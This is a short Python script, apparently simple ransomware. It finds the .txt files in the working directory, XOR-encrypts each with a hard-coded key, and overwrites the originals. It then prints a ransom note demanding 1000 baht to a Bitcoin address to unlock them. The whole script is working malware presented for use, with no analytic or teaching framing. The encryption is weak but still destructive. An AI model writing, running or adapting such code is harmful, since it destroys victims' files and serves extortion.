# variables
meth = 1
textFiles = []
mask = False
key = [13,45,44]

# functions
def encrypt(s,key,decrypt = False):
	# xor encrypt a file
	out = ""
	for i in range(len(s)):
		if not decrypt:
			out += chr(ord(s[i]) ^ key[i%len(key)])
		else:
			out += chr(key[i%len(key)] ^ ord(s[i]))
	return out

if meth == 1:
	# 1)OS module - list files by extensions
	import os
	allFiles = os.listdir()
	textFiles = list(filter(lambda x: x[len(x)-4:] == ".txt",allFiles))
	print("text = ", textFiles)
elif meth == 2:
	# 2) glob module - list files by extension
	import glob
	textFiles = glob.glob("*.txt")
	
for fname in textFiles:
	fil = open(fname,"r+")
	out = encrypt(fil.read(),key)
	fil.close()
	print(out)
	print(fname)
	
	gil = open(fname,"w+")
	gil.write(out)
	gil.close()
print("""
your files have all been encrypted.
send 1000 baht to the following BTC address to unlock:
1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2
""")
	